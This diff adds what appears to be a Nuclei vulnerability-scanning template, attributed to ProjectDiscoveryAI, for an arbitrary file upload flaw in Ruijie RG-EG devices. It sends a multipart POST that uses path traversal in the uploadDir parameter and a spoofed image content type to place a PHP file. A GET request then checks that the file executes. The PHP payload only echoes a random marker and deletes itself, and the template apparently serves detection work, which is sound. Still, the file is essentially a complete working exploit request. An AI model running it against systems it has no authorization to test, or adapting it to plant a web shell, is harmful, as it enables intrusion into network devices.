@@ -1,0 +1,46 @@
+id: ruijie-file-upload-exploit
+info:
+  name: Ruijie RG-EG File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploits an arbitrary file upload vulnerability in Ruijie RG-EG devices, which could allow an attacker to upload a PHP file and execute arbitrary code.
+  reference:
+    - https://example.com/vulnerability-details
+
+variables:
+  s1: "{{rand_text_alphanumeric(8)}}"
+  s2: "{{rand_text_alphanumeric(8)}}"
+  rboundary: "{{rand_text_alphanumeric(8)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/ddi/server/fileupload.php?uploadDir=../../&name={{s2}}.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}"
+    body: |
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="file"; filename="{{s2}}.php"
+      Content-Type: image/jpeg
+
+      <?php echo "{{s1}}"; unlink(__FILE__); ?>
+      ------WebKitFormBoundary{{rboundary}}--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{s2}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{s1}}"
